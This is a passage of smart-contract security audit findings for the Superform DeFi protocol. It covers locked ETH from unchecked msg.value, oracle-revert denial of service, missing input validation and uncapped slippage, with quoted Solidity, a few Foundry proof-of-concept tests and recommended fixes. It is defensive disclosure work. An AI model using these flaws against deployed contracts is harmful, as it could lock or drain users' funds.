During the call to the `multiDstSingleVaultDeposit` function, the normal logic allows users to pledge ETH assets, or other ERC20 assets. However, when a user pledges ERC20 assets, i.e. when `vaultData_.liqData.token ≠ NATIVE`, the code does not limit the user's `msg.value` to not be 0. If the user sends ETH when calling the function, the sent asset will be locked in the contract.

```solidity
function multiDstSingleVaultDeposit(MultiDstSingleVaultStateReq calldata req_)
        external
        payable
        override(BaseRouter, IBaseRouter)
    {
        uint64 srcChainId = CHAIN_ID;
        uint256 balanceBefore = address(this).balance - msg.value;
        uint256 len = req_.dstChainIds.length;

        for (uint256 i; i < len; ++i) {
            if (srcChainId == req_.dstChainIds[i]) {
                _singleDirectSingleVaultDeposit(SingleDirectSingleVaultStateReq(req_.superformsData[i]));
            } else {
                _singleXChainSingleVaultDeposit(
                    SingleXChainSingleVaultStateReq(req_.ambIds[i], req_.dstChainIds[i], req_.superformsData[i])
                );
            }
        }

        _forwardPayment(balanceBefore);
    }

```

The entire deposit call chain does not check the above situation.

**Recommendation**:

It is recommended that when the user's pledged asset is erc20, determine whether msg.value is 0



### Unhandled Oracle Revert, Potential Denial Of Service

**Severity:** Low risk

**Context:** _(No context files were provided by the reviewer)_

- Severity
Medium

- Relevant GitHub Links
https://github.com/superform-xyz/superform-core/blob/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/payments/PaymentHelper.sol#L830-L854

- Summary

The `PaymentHelper` functions `_getGasPrice` & `_getNativeTokenPrice` contains a critical issue related to the handling of Chainlink oracle calls. The `_getGasPrice` and `_getNativeTokenPrice` functions do not adequately handle potential reverts from Chainlink oracles, which could lead to a complete Denial-of-Service (DoS) for functions relying on them.

- Vulnerability Details

The vulnerable functions `_getGasPrice` and `_getNativeTokenPrice` lack proper error handling for Chainlink oracle calls. Specifically:

- There is no try/catch mechanism to gracefully handle potential reverts from Chainlink oracles.
- The functions do not provide fallback logic in case of denied access to the Chainlink oracle, leaving the contract susceptible to becoming permanently unusable.

- Impact

The lack of proper error handling and fallback mechanisms poses a severe risk to functions relying on these functions. In the event of Chainlink oracle malfunction or denial of access, affected contracts could face a complete Denial-of-Service, rendering them permanently bricked. 

- POC

- **Function Calls Trigger Vulnerability:**
   If `paymentHelper` calls any of the functions, such as `estimateSingleXChainSingleVault`, `estimateSingleXChainMultiVault`, `estimateMultiDstSingleVault`, or `estimateMultiDstMultiVault`.

- **Common Function Involvement:**
   Each of these functions involves a common step denoted as `/// @dev step 7: convert all dst gas estimates to src chain estimate`.

- **Critical Line Utilizes `_convertToNativeFee`:**
   In this common step, the critical line is:
   ```solidity
   dstAmount += _convertToNativeFee(req_.dstChainIds[i], totalDstGas);
   ```
   which internally invokes `_convertToNativeFee`.

- **Dependency on `_convertToNativeFee`:**
   `_convertToNativeFee` is crucial as it employs `_getNativeTokenPrice` to convert gas fees to USD value.

- **Chainlink Oracle Dependency:**
   The issue lies in the fact that `_getNativeTokenPrice` relies on Chainlink's price feeds accessed through `AggregatorV3Interface(oracleAddr).latestRoundData()`.

- **Potential Revert Due to Chainlink Block:**
   If Chainlink's multisigs decide to block access to the price feeds during runtime, executing `AggregatorV3Interface(oracleAddr).latestRoundData()` within `_getNativeTokenPrice` would result in a revert.

- **Repercussions on Calling Functions:**
   Consequently, any function calling `_convertToNativeFee`, including `estimateSingleXChainSingleVault`, `estimateSingleXChainMultiVault`, `estimateMultiDstSingleVault`, and `estimateMultiDstMultiVault`, would also revert.

- Tools used

- Manual review

- Recommendations

To mitigate the identified vulnerability, we recommend the following actions:

1. Implement try/catch blocks in the `_getGasPrice` and `_getNativeTokenPrice` functions to gracefully handle potential reverts from Chainlink oracle calls.
2. Introduce fallback logic within the catch block to provide an alternative data source or update oracle feeds in case of malfunction or denial of access.
3. Ensure that the fallback logic includes setting a fixed price for the token or involves a reliable alternative oracle to prevent a complete Denial-of-Service scenario.

This remediation is crucial for maintaining the robustness and security of the smart contract, especially given its reliance on external oracles for critical data. We strongly advise prompt implementation of these recommendations to prevent potential exploitation of the identified vulnerability.



### amountIn emitted in CrossChainInitiatedDepositSingle event can be incorrect

**Severity:** Low risk

**Context:** _(No context files were provided by the reviewer)_

**Description**:
The `CrossChainInitiatedDepositSingle` event is emitted at the end of the `_singleXChainSingleVaultDeposit()` function.
This event emits the `amountIn` value.

`amountIn` value is returned by the `_singleVaultTokenForward()` function.
The problem is that the `amountIn` returned value is only set when a swap is required (when `v.txDataLength != 0`).


When no swap is needed (when `v.txDataLength == 0`), the returned `amountIn` will not be set in `_singleVaultTokenForward()` and remain zero.
`CrossChainInitiatedDepositSingle` will emits zero as `amountIn` value.


Scope:
- https://github.com/superform-xyz/superform-core/blob/e7d53f306989ba205c779973d1b5e86755a1b9c0/src/BaseRouterImplementation.sol#L165-L166
- https://github.com/superform-xyz/superform-core/blob/e7d53f306989ba205c779973d1b5e86755a1b9c0/src/BaseRouterImplementation.sol#L202-L204
- https://github.com/superform-xyz/superform-core/blob/e7d53f306989ba205c779973d1b5e86755a1b9c0/src/BaseRouterImplementation.sol#L894-L898
- https://github.com/superform-xyz/superform-core/blob/e7d53f306989ba205c779973d1b5e86755a1b9c0/src/BaseRouterImplementation.sol#L950

**Proof of concept**:
```solidity
    function _singleXChainSingleVaultDeposit(SingleXChainSingleVaultStateReq memory req_) internal virtual {
        ...
        (uint256 amountIn, uint8 bridgeId) =
            _singleVaultTokenForward(msg.sender, address(0), req_.superformData.permit2data, ambData);
        ...
        emit CrossChainInitiatedDepositSingle(
            vars.currentPayloadId, req_.dstChainId, req_.superformData.superformId, amountIn, bridgeId, req_.ambIds
        );
    }

    function _singleVaultTokenForward(
        address srcSender_,
        address target_,
        bytes memory permit2data_,
        InitSingleVaultData memory vaultData_
    )
        internal
        virtual
        returns (uint256, uint8)
    {
        SingleTokenForwardLocalVars memory v; // @audit v.amountIn is initialized to zero
        ...
        if (v.txDataLength != 0) {
            // @audit in this case, v.amountIn is set
            v.amountIn = IBridgeValidator(superRegistry.getBridgeValidator(v.bridgeId)).decodeAmountIn(
                vaultData_.liqData.txData, false
            );
        }

        if (vaultData_.liqData.token != NATIVE) {
            v.token = IERC20(vaultData_.liqData.token);

            if (v.txDataLength == 0) {
                v.approvalAmount = vaultData_.amount;
            } else {
                v.approvalAmount = v.amountIn;
                /// e.g asset in is USDC (6 decimals), we use this amount to approve the transfer to superform
            }
            ...
        }

        // @audit v.amountIn is returned
        return (v.amountIn, v.bridgeId);
    }
```

**Recommendation**:
Set `v.amountIn` in `_singleVaultTokenForward` by using the following code:

```solidity
    function _singleVaultTokenForward(
        address srcSender_,
        address target_,
        bytes memory permit2data_,
        InitSingleVaultData memory vaultData_
    )
        internal
        virtual
        returns (uint256, uint8)
    {
        SingleTokenForwardLocalVars memory v; // @audit v.amountIn is initialized to zero
        ...
        if (v.txDataLength != 0) {
            // @audit in this case, v.amountIn is set
            v.amountIn = IBridgeValidator(superRegistry.getBridgeValidator(v.bridgeId)).decodeAmountIn(
                vaultData_.liqData.txData, false
            );
        }
        else {
            v.amountIn = vaultData_.amount;
        }
        ...
    }
```



### Unable to withdraw excess eth/token from the contract

**Severity:** Low risk

**Context:** [BaseForm.sol#L159-L159](superform-core/src/BaseForm.sol#L159-L159)

**Description**:

In normal circumstances, anyone can send ETH to the `BaseForm`, `BaseRouter`, and `DstSwapper` contracts, as they all have the following function. Besides, other ERC20 assets can also be sent to the contract.

```
receive() external payable { }
```

However, these functions do not have a design similar to the `withdrawTo()` function in the `PayMaster` contract, which can take out the excess ETH.

```solidity
function withdrawTo(bytes32 superRegistryId_, uint256 nativeAmount_) external override onlyPaymentAdmin {
  if (nativeAmount_ > address(this).balance) {
      revert Error.FAILED_TO_SEND_NATIVE();
  }

  _withdrawNative(superRegistry.getAddress(superRegistryId_), nativeAmount_);
}

```

This means that if users accidentally send ETH to the aforementioned contracts, whether intentionally or unintentionally. Or over time, a lot of unclaimed assets remain in the contract, both the administrator and users are unable to withdraw the ETH. Other unclaimed assets, or tokens **airdropped** by other projects, cannot be withdrawn either.



**Recommendation**:


It is recommended to design a function similar to `withdrawTo` that can withdraw the excess funds from the contract. Here, it is important to differentiate between ETH and other ERC20s. Also, we must ensure that only the excess funds can be withdrawn, not the users' assets.



### Assuming Oracle Price Precision can lead to Inaccurate Gas Calculation Fees in `_convertToNativeFee`

**Severity:** Low risk

**Context:** _(No context files were provided by the reviewer)_

- Severity
Low

- Relevant GitHub Links
https://github.com/superform-xyz/superform-core/blob/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/payments/PaymentHelper.sol#L798-L819

- Summary
In the `PaymentHelper` contract, the function `_convertToNativeFee` is used for xChain gas estimation. However, it currently relies on non-ETH pairs, assuming a decimal precision of 8. In the broader context, Superform can be deployed on additional EVM chains, and if deployed on chains where price feeds have 18 decimals or if using ETH pairs that require precision up to 18 decimals, there may be issues with compatibility.

- Vulnerability Details
The issue lies in assuming a fixed decimal precision (8 decimals) for price feeds, which may not hold true for all chains and pairs. Different chains or specific pairs might have different decimal precisions. For instance, non-ETH pairs typically use 8 decimals, while ETH pairs use 18 decimals.

- Impact
The impact of this issue could lead to inaccurate gas estimation if Superform is deployed on chains with different decimal precision for price feeds or if it utilizes ETH pairs that require 18 decimals.

- Tools Used
- Manual review

- Recommendations
Smart contracts should dynamically determine the decimal precision for the relevant price feed by calling `AggregatorV3Interface.decimals()` to ensure compatibility with different chains and pairs. This approach will prevent assumptions about a fixed decimal precision and accommodate various scenarios, enhancing the robustness and flexibility of the system.



### Unchecked `msg.value` in `retryPayload()`

**Severity:** Low risk

**Context:** [WormholeARImplementation.sol#L167-L167](superform-core/src/crosschain-data/adapters/wormhole/automatic-relayer/WormholeARImplementation.sol#L167-L167)

**Description**:

The wormhole contract has the following annotation for the `resendToEvm` function:

https://etherscan.io/address/0x69009c6f567590d8b469dbf4c8808e8ee32b8a45#code

```solidity
/**
   * @notice Requests a previously published delivery instruction to be redelivered
   * (e.g. with a different delivery provider)
   *
   * This function must be called with `msg.value` equal to
   * quoteEVMDeliveryPrice(targetChain, newReceiverValue, newGasLimit, newDeliveryProviderAddress)
   *
   * @param deliveryVaaKey VaaKey identifying the wormhole message containing the
   *        previously published delivery instructions
   * @param targetChain The target chain that the original delivery targeted. Must match targetChain from original delivery instructions
   * @param newReceiverValue new msg.value that delivery provider should pass in for call to `targetAddress` (in targetChain currency units)
   * @param newGasLimit gas limit with which to call `targetAddress`. Any units of gas unused will be refunded according to the
   *        `targetChainRefundPerGasUnused` rate quoted by the delivery provider, to the refund chain and address specified in the original request
   * @param newDeliveryProviderAddress The address of the desired delivery provider's implementation of IDeliveryProvider
   * @return sequence sequence number of published VAA containing redelivery instructions
   */
  function resendToEvm(
    VaaKey memory deliveryVaaKey,
    uint16 targetChain,
    uint256 newReceiverValue,
    uint256 newGasLimit,
    address newDeliveryProviderAddress
  ) external payable returns (uint64 sequence);

```

This specifically emphasizes that `msg.value` should be equal to the value calculated by `quoteEVMDeliveryPrice()`.

But when we look at the call to the `resendToEvm` function in the `WormholeARImplementation` contract, there is no check on the passed in `mag.value`. If the value of `msg.value` is not equal to the result calculated by the `quoteEVMDeliveryPrice()` function, the execution may likely revert.

```
function retryPayload(bytes memory data_) external payable override {
        (
            VaaKey memory deliveryVaaKey,
            uint16 targetChain,
            uint256 newReceiverValue,
            uint256 newGasLimit,
            address newDeliveryProviderAddress
        ) = abi.decode(data_, (VaaKey, uint16, uint256, uint256, address));

        if (newDeliveryProviderAddress == address(0)) {
            revert Error.ZERO_ADDRESS();
        }

        relayer.resendToEvm{ value: msg.value }(//@audit
            deliveryVaaKey, targetChain, newReceiverValue, newGasLimit, newDeliveryProviderAddress
        );
    }
```



**Recommendation**:


It is recommended to check whether the value of `msg.value` is equal to the result calculated by the `quoteEVMDeliveryPrice` function.



### Missing Validation for `srcChainId_` in Cross-Chain Deposit Functions

**Severity:** Low risk

**Context:** _(No context files were provided by the reviewer)_

- Severity
Medium

- Relevant GitHub Links
https://github.com/superform-xyz/superform-core/blob/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/BaseForm.sol#L206-L218

https://github.com/superform-xyz/superform-core/blob/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/forms/ERC4626Form.sol#L40-L50

https://github.com/superform-xyz/superform-core/blob/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/forms/ERC4626FormImplementation.sol#L246-L273

- Summary
The `BaseForm.sol::xChainDepositIntoVault`  lacks proper validation for the `srcChainId_` parameter in functions related to cross-chain deposits. Without explicit checks, the chain ID could be manipulated or set to an invalid value, potentially leading to unexpected behavior and security risks.

- Vulnerability Details
The `srcChainId_` parameter is used in various functions without adequate validation. If an attacker can manipulate this parameter, it might result in unauthorized cross-chain operations, inconsistent event logs, or misalignment of chain references. The absence of validation checks creates potential security vulnerabilities.

- Impact
- **Invalid Chain ID:** The contract may misbehave or fail to execute intended logic if `srcChainId_` is set to an invalid or non-existent chain ID.
- **Unauthorized Operations:** Manipulating `srcChainId_` allows an attacker to initiate cross-chain operations from an unexpected source, leading to unauthorized deposits or withdrawals.
- **Inconsistent Logging:** Events logging cross-chain operations may contain incorrect or inconsistent information, hindering monitoring and auditing processes.
- **Chain Misalignment:** Manipulating `srcChainId_` could result in a misalignment of chain references, causing incorrect calculations or unexpected state changes.

- Tools Used
Manual review

- Recommendations
Implement explicit validation checks for `srcChainId_` in relevant functions to ensure it is within the expected range, corresponds to a valid chain ID, and adheres to any constraints defined by the cross-chain logic. This validation is crucial for preventing unauthorized actions and maintaining the integrity of cross-chain operations.



### Lack of Validation for Destination Domain in `dispatchPayload`

**Severity:** Low risk

**Context:** _(No context files were provided by the reviewer)_

- Severity
**LOW**

- Relevant GitHub Links
https://github.com/superform-xyz/superform-core/blob/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-data/adapters/hyperlane/HyperlaneImplementation.sol#L126-L143

- Summary
The contract `HyperlaneImplementation` lacks validation for the destination domain (`domain`) derived from the `ambChainId[dstChainId_]` operation in the `dispatchPayload` function. This omission could lead to unintended consequences, including the loss or misrouting of messages when the derived `domain` is zero.

- Vulnerability Details
The issue stems from the absence of a validation check to ensure that the derived `domain` value is not zero. The relevant code snippet is as follows:

```solidity
function dispatchPayload(
    address srcSender_,
    uint64 dstChainId_,
    bytes memory message_,
    bytes memory extraData_
)
    external
    payable
    virtual
    override
    onlyValidStateRegistry
{
    uint32 domain = ambChainId[dstChainId_];

    // Validation check for domain == 0 is missing

    mailbox.dispatch{ value: msg.value }(
        domain, _castAddr(authorizedImpl[domain]), message_, _generateHookMetadata(extraData_, srcSender_)
    );
}
```

- Impact
The lack of validation for the destination domain can lead to messages being intended for domain zero, potentially resulting in message loss or misrouting. This poses a critical risk to the correct functioning of the contract and its intended communication with other domains.

- Tools used
- Manual review

- Recommendations
It is recommended to implement a validation check at the beginning of the `dispatchPayload` function to ensure that the derived `domain` value is not zero. Here's an example of how the code can be modified:

```solidity
function dispatchPayload(
    address srcSender_,
    uint64 dstChainId_,
    bytes memory message_,
    bytes memory extraData_
)
    external
    payable
    virtual
    override
    onlyValidStateRegistry
{
    uint32 domain = ambChainId[dstChainId_];

    require(domain != 0, "HyperlaneImplementation: Invalid destination domain");

    mailbox.dispatch{ value: msg.value }(
        domain, _castAddr(authorizedImpl[domain]), message_, _generateHookMetadata(extraData_, srcSender_)
    );
}
```

This modification ensures that the `domain` value is not zero before proceeding with the message dispatch, mitigating the risk associated with unintended consequences.



### miss checks the arrays' length

**Severity:** Low risk

**Context:** _(No context files were provided by the reviewer)_

**Description**:

The following function passes in multiple array parameters, but does not check whether the lengths of the arrays are the same.

```
    function batchProcessTx(
        uint256 payloadId_,
        uint256[] calldata indices,
        uint8[] calldata bridgeIds_,
        bytes[] calldata txData_
    )
        external
        override
        onlySwapper
        nonReentrant
    {
        IBaseStateRegistry coreStateRegistry = _getCoreStateRegistry();

        _isValidPayloadId(payloadId_, coreStateRegistry);

        (,, uint8 multi,,,) = DataLib.decodeTxInfo(coreStateRegistry.payloadHeader(payloadId_));
        if (multi != 1) revert Error.INVALID_PAYLOAD_TYPE();

        InitMultiVaultData memory data = abi.decode(coreStateRegistry.payloadBody(payloadId_), (InitMultiVaultData));

        uint256 len = txData_.length;
        for (uint256 i; i < len; ++i) {
            _processTx(//@audit 
                payloadId_, indices[i], bridgeIds_[i], txData_[i], data.liqData[i].interimToken, coreStateRegistry
            );
        }
    }


    function batchUpdateFailedTx(
        uint256 payloadId_,
        uint256[] calldata indices_,
        address[] calldata interimTokens_,
        uint256[] calldata amounts_
    )
        external
        override
        onlySwapper
    {
        uint256 len = indices_.length;

        IBaseStateRegistry coreStateRegistry = _getCoreStateRegistry();

        _isValidPayloadId(payloadId_, coreStateRegistry);

        (,, uint8 multi,,,) = DataLib.decodeTxInfo(coreStateRegistry.payloadHeader(payloadId_));
        if (multi != 1) revert Error.INVALID_PAYLOAD_TYPE();

        InitMultiVaultData memory data = abi.decode(coreStateRegistry.payloadBody(payloadId_), (InitMultiVaultData));

        for (uint256 i; i < len; ++i) {
            _updateFailedTx(//@audit 
                payloadId_, indices_[i], interimTokens_[i], data.liqData[i].interimToken, amounts_[i], coreStateRegistry
            );
        }
    }

```

**Recommendation**:


It is recommended to add a check for the array length



### Unchecked `msg.value` and `nativeAmount` for Consistency

**Severity:** Low risk

**Context:** _(No context files were provided by the reviewer)_

**Description**:

In the deposit operation of the router contract, the passed in req parameter can be customized. Take the `singleDirectSingleVaultDeposit()` function as an example

```solidity
function singleDirectSingleVaultDeposit(SingleDirectSingleVaultStateReq memory req_)
    external
    payable
    override(BaseRouter, IBaseRouter)
{
    uint256 balanceBefore = address(this).balance - msg.value;

    _singleDirectSingleVaultDeposit(req_); // @audit
    _forwardPayment(balanceBefore);
}

```

Let's look at the function call chain

```solidity
function _singleDirectSingleVaultDeposit(SingleDirectSingleVaultStateReq memory req_) internal virtual {
			......
    _directSingleDeposit(msg.sender, req_.superformData.permit2data, vaultData);
    emit Completed();
}

----------------------------
function _directSingleDeposit(
        ......
        dstAmount = _directDeposit(
            superform,
            vaultData_.payloadId,
            vaultData_.superformId,
            vaultData_.amount,
            vaultData_.maxSlippage,
            vaultData_.retain4626,
            vaultData_.liqData,
            vaultData_.receiverAddress,
            vaultData_.extraFormData,
            vaultData_.liqData.nativeAmount,// @audit  no check amount with msg.value
            srcSender_
        );

----------------

function _directDeposit(
        address superform_,
        uint256 payloadId_,
        uint256 superformId_,
        uint256 amount_,
        uint256 maxSlippage_,
        bool retain4626_,
        LiqRequest memory liqData_,
        address receiverAddress_,
        bytes memory extraFormData_,
        uint256 msgValue_,
        address srcSender_
    )
        internal
        virtual
        returns (uint256 dstAmount)
    {
        /// @dev deposits token to a given vault and mint vault positions directly through the form
        dstAmount = IBaseForm(superform_).directDepositIntoVault{ value: msgValue_ }(
				..........
			)

```

From the entire call chain, there is no check for the relationship between `msg.value` and `nativeAmount`. If `nativeAmount > msg.value`, then when calling `directDepositIntoVault`, it might consume the router contract's ETH, if the router contract has ETH. There is also a situation where a revert may occur due to insufficient ETH. Another situation is when `msg.value > nativeAmount`. Then the user will also lose assets.

**Recommendation**:


It is suggested to check the relationship between `msg.value` and `nativeAmount`.



### `revokeRoleSuperBroadcast()` Does Not Handle Excess eth

**Severity:** Low risk

**Context:** _(No context files were provided by the reviewer)_

**Description**:


When executing the `revokeRoleSuperBroadcast()` function, eth is sent.

```solidity
function revokeRoleSuperBroadcast(
      bytes32 role_,
      bytes memory extraData_,
      bytes32 superRegistryAddressId_
  )
      external
      payable
      override
      onlyRole(PROTOCOL_ADMIN_ROLE)
  {
      /// @dev revokeRoleSuperBroadcast cannot update the PROTOCOL_ADMIN_ROLE, EMERGENCY_ADMIN_ROLE, BROADCASTER_ROLE
      /// and WORMHOLE_VAA_RELAYER_ROLE
      if (
          role_ == PROTOCOL_ADMIN_ROLE || role_ == EMERGENCY_ADMIN_ROLE || role_ == BROADCASTER_ROLE
              || role_ == WORMHOLE_VAA_RELAYER_ROLE
      ) revert Error.CANNOT_REVOKE_NON_BROADCASTABLE_ROLES();
      _revokeRole(role_, superRegistry.getAddress(superRegistryAddressId_));
      if (extraData_.length != 0) {
          BroadcastMessage memory rolesPayload = BroadcastMessage(
              "SUPER_RBAC", SYNC_REVOKE, abi.encode(++xChainPayloadCounter, role_, superRegistryAddressId_)
          );
          _broadcast(abi.encode(rolesPayload), extraData_);
      }
  }

function _broadcast(bytes memory message_, bytes memory extraData_) internal {
    (uint8 ambId, bytes memory broadcastParams) = abi.decode(extraData_, (uint8, bytes));
    /// @dev ambIds are validated inside the factory state registry
    /// @dev if the broadcastParams are wrong, this will revert in the amb implementation
    IBroadcastRegistry(superRegistry.getAddress(keccak256("BROADCAST_REGISTRY"))).broadcastPayload{
        value: msg.value
    }(msg.sender, ambId, message_, broadcastParams);
}

```

However, the excess msg.value is not returned.

**Recommendation**:

It is recommended to return the excess eth



### The user is not capped on negative slippage as the comments suggets

**Severity:** Low risk

**Context:** [DstSwapper.sol#L358-L358](superform-core/src/crosschain-liquidity/DstSwapper.sol#L358-L358)

- Summary 
```solidity
/// @notice This doesn't mean that the keeper or the user can swap any amount, due to the 2nd slippage check
/// in CoreStateRegistry.
/// @notice In this check, we verify if there is negative slippage; in such cases, the user is capped to receive
/// the originally defined v.expAmount of tokens.
```

In the comments above, it is mentioned that users will not be able to receive more than their appointed max amount. However, that is not the case, as `swappedAmount` is set to `balanceDiff`.

```solidity
swappedAmount[payloadId_][index_] = v.balanceDiff;
```

This means that users will receive the negative slippage (profit from a favorable trade), and it is not capped.

- Suggested Solution
Change it so that negative slippage is capped.

```diff
+   if (v.balanceDiff > v.expAmount) v.balanceDiff = v.expAmount;
    swappedAmount[payloadId_][index_] = v.balanceDiff;
```



### `formImplementations` can contain duplicate elements

**Severity:** Low risk

**Context:** [SuperformFactory.sol#L194-L194](superform-core/src/SuperformFactory.sol#L194-L194)

**Description**:

The function of the `addFormImplementation` function is to add a form implementation to a form factory contract. It takes two parameters: `formImplementation_` and `formImplementationId_`. `formImplementation_` is the address of the form implementation to be added, and `formImplementationId_` is the unique identifier of this form implementation.

```solidity
function addFormImplementation(
    address formImplementation_,
    uint32 formImplementationId_
)
    public
    override
    onlyProtocolAdmin
{
    if (formImplementation_ == address(0)) revert Error.ZERO_ADDRESS();
    if (!ERC165Checker.supportsERC165(formImplementation_)) revert Error.ERC165_UNSUPPORTED();
    if (formImplementation[formImplementationId_] != address(0)) {
        revert Error.FORM_IMPLEMENTATION_ID_ALREADY_EXISTS();
    }
    if (!ERC165Checker.supportsInterface(formImplementation_, type(IBaseForm).interfaceId)) {
        revert Error.FORM_INTERFACE_UNSUPPORTED();
    }

    /// @dev save the newly added address in the mapping and array registry
    formImplementation[formImplementationId_] = formImplementation_;

    formImplementations.push(formImplementation_);//@audit

    emit FormImplementationAdded(formImplementation_, formImplementationId_);
}

```

But here it does not check whether `formImplementation_` is duplicated, that is, multiple `formImplementationId_` can point to the same `formImplementation_`. This could lead to confusion in later operations.



For example, `formImplementationId_A` and `formImplementationId_B` point to the same `formImplementation_`. Then if you execute `createSuperform(formImplementationId_A,address vault_) `afterwards, you cannot execute `createSuperform(formImplementationId_B,address vault_)`, because `VAULT_FORM_IMPLEMENTATION_COMBINATION_EXISTS` error will occur.

```solidity
bytes32 vaultFormImplementationCombination = keccak256(abi.encode(tFormImplementation, vault_));
  if (vaultFormImplCombinationToSuperforms[vaultFormImplementationCombination] != 0) {
      revert Error.VAULT_FORM_IMPLEMENTATION_COMBINATION_EXISTS();
  }

```

- poc

```
// file : test\unit\superform-factory\superform-factory.addImplementation.sol
function test_revert_addForm_sameFormImplementation() public {
        vm.selectFork(FORKS[chainId]);

        address formImplementation = address(new ERC4626Form(getContract(chainId, "SuperRegistry")));
        uint32 formImplementationId1 = 0;
        uint32 formImplementationId2 = 5;

        vm.startPrank(deployer);
        SuperformFactory(getContract(chainId, "SuperformFactory")).addFormImplementation(
            formImplementation, formImplementationId1
        );
        address imp =
            SuperformFactory(getContract(chainId, "SuperformFactory")).getFormImplementation(formImplementationId1);
        assertEq(imp, formImplementation);

        SuperformFactory(getContract(chainId, "SuperformFactory")).addFormImplementation(
            formImplementation, formImplementationId2
        );


    }
```
output
```
forge test --match-test test_revert_addForm_sameFormImplementation  -vvv
[⠢] Compiling...
[⠔] Compiling 1 files with 0.8.23
[⠒] Solc 0.8.23 finished in 6.15s

Running 1 test for test/unit/superform-factory/superform-factory.addImplementation.sol:SuperformFactoryAddImplementationTest
[PASS] test_revert_addForm_sameFormImplementation() (gas: 5232708)
Test result: ok. 1 passed; 0 failed; 0 skipped; finished in 9.81s
```


**Recommendation**:

It is recommended to check whether `formImplementation_` is reused in the `addFormImplementation` function.




### The `changeFormImplementationPauseStatus` Will Lock ETH

**Severity:** Low risk

**Context:** [SuperformFactory.sol#L264-L264](superform-core/src/SuperformFactory.sol#L264-L264)

**Description**:

`changeFormImplementationPauseStatus` is an external payable function, which means it can accept ETH transfers. When this function is called, if the `extraData` parameter is empty, it will skip the cross-chain broadcasting logic. However, because this function is `payable`, even if `msg.value` is not zero, the transaction will not revert. This means that when `extraData_.length == 0` and `msg.value != 0`, the sent ETH will be locked in the contract.


- poc
```solidity
function test_changeFormImplementationPauseStatuslocketh() public {
        vm.startPrank(deployer);

        vm.selectFork(FORKS[chainId]);

        address superRegistry = getContract(chainId, "SuperRegistry");

        /// @dev Deploying Forms
        address formImplementation1 = address(new ERC4626Form(superRegistry));
        uint32 formImplementationId = 0;

        // Deploying Forms Using AddImplementation. Not Testing Reverts As Already Tested
        SuperformFactory(getContract(chainId, "SuperformFactory")).addFormImplementation(
            formImplementation1, formImplementationId
        );

        SuperformFactory(getContract(chainId, "SuperformFactory")).changeFormImplementationPauseStatus{
            value: 800 * 10 ** 18
        }(formImplementationId, ISuperformFactory.PauseStatus.PAUSED, "");

        bool status = SuperformFactory(payable(getContract(chainId, "SuperformFactory"))).isFormImplementationPaused(
            formImplementationId
        );

        assertEq(status, true);
    }
```

**Recommendation**:

It is recommended that when `extraData` is empty, `msg.value` must also be zero, otherwise revert the transaction.



### Inadequate Validation of User Input in `_singleXChainMultiVaultDeposit` May Cause Loss of Funds

**Severity:** Low risk

**Context:** _(No context files were provided by the reviewer)_

- links :

- [\_singleXChainMultiVaultDeposit](https://github.com/superform-xyz/superform-core/blob/main/src/BaseRouterImplementation.sol#L232)
- [updateDepositPayload](https://github.com/superform-xyz/superform-core/blob/main/src/crosschain-data/extensions/CoreStateRegistry.sol#L83)
- [processPayload](https://github.com/superform-xyz/superform-core/blob/main/src/crosschain-data/extensions/CoreStateRegistry.sol#L147)
- [\_multiDeposit](https://github.com/superform-xyz/superform-core/blob/main/src/crosschain-data/extensions/CoreStateRegistry.sol#L750)
- [\_updateMultiDeposit](https://github.com/superform-xyz/superform-core/blob/main/src/crosschain-data/extensions/CoreStateRegistry.sol#L386)

- Vulnerability Details

- The [\_singleXChainMultiVaultDeposit](https://github.com/superform-xyz/superform-core/blob/main/src/BaseRouterImplementation.sol#L232) function in the super router contract is responsible for handling cross-chain multi-vault deposit requests. It accepts a [\_singleXChainMultiVaultDeposit](https://github.com/superform-xyz/superform-core/blob/main/src/BaseRouterImplementation.sol#L232) struct as input, which contains several arrays including _superformIds_, _hasDstSwaps_, _retain4626s_ .... These arrays are expected to have the same length, as they correspond to each other on a per-superform basis.

- However, the function does not validate that the lengths of the `hasDstSwaps` and `retain4626s` arrays are equal to the length of the superformIds array as we see here :

```js
  function _validateSuperformsData(MultiVaultSFData memory superformsData_,uint64 dstChainId_,bool deposit_)internal view virtual returns
     (bool){
        uint256 len = superformsData_.amounts.length;
        uint256 lenSuperforms = superformsData_.superformIds.length;
        uint256 liqRequestsLen = superformsData_.liqRequests.length;

        /// @dev empty requests are not allowed, as well as requests with length mismatch
        if (len == 0 || liqRequestsLen == 0) return false;
        if (len != liqRequestsLen) return false;

        /// @dev deposits beyond max vaults per tx is blocked only for xchain
        if (lenSuperforms > superRegistry.getVaultLimitPerTx(dstChainId_)) {
            return false;
        }

        /// @dev superformIds/amounts/slippages array sizes validation
        if (!(lenSuperforms == len && lenSuperforms == superformsData_.maxSlippages.length)) {
            return false;
        }
        ISuperformFactory factory = ISuperformFactory(superRegistry.getAddress(keccak256("SUPERFORM_FACTORY")));
        bool valid;
        /// @dev slippage, amount, paused status validation
        for (uint256 i; i < len; ++i) {
            valid = _validateSuperformData(
                superformsData_.superformIds[i],
                superformsData_.maxSlippages[i],
                superformsData_.amounts[i],
                superformsData_.receiverAddress,
                dstChainId_,
                deposit_,
                factory
            );

            if (!valid) {
                return valid;
            }
        }

        return true;
    }
```

- This can lead to a critical issue on the destination chain in case one of this two lengths are less then the `superFormIds` length where it's expects these arrays to be of equal length.

- On the destination chain, the [updateDepositPayload](https://github.com/superform-xyz/superform-core/blob/main/src/crosschain-data/extensions/CoreStateRegistry.sol#L83) function is the first step in the cross-chain deposit process. It is intended to be called by a keeper to update the amounts received for a cross-chain action, such as a multi-vault deposit. The function determines whether the deposit action can proceed to the next stage, where funds are deposited into the respective superforms, or if the action has failed, allowing users to rescue their funds.

- inside [updateDepositPayload](https://github.com/superform-xyz/superform-core/blob/main/src/crosschain-data/extensions/CoreStateRegistry.sol#L83) the [\_updateMultiDeposit](https://github.com/superform-xyz/superform-core/blob/main/src/crosschain-data/extensions/CoreStateRegistry.sol#L386) function is called to update the amounts received. This function iterates over the elements of the struct (which the user struct received from the srcChain) using the length of the `finalAmounts_`, which is same length as the `superformIds` array.in this case if `hasDstSwaps` is shorter than expected (which not validated in the srcChain), the function will attempt to access an undefined index, which will always revert with `panic 0x32` :

```js
    function _updateMultiDeposit(
